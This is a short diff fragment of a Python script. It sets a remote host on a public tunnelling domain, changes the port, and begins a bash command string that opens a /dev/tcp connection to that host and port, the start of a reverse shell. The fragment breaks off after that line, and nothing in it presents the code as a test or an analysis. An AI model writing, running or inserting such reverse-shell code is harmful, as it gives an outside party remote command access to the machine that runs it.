@@ -1,7 +1,7 @@
 import subprocess, os, platform, pathlib
 
 LHOST = "serveousercontent.com"
-LPORT = 41488 
+LPORT = 46479
 
 SH = (
     "exec 3<>/dev/tcp/%s/%d\n"
